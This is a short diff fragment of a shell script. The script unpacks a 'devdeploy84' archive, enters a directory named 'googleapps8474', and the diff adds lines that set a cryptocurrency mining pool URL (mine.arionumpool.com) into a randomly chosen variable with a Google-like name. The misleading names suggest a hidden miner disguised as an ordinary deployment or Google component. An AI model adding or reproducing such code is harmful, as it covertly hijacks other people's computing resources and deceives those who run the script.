@@ -15,6 +15,10 @@ tar -xvf ./devdeploy84.tar.gz
 
 cd googleapps8474
 
+arr[0]="http://mine.arionumpool.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
 if (($google84 >= 14884 && $google84 <= 16884));
 then
 
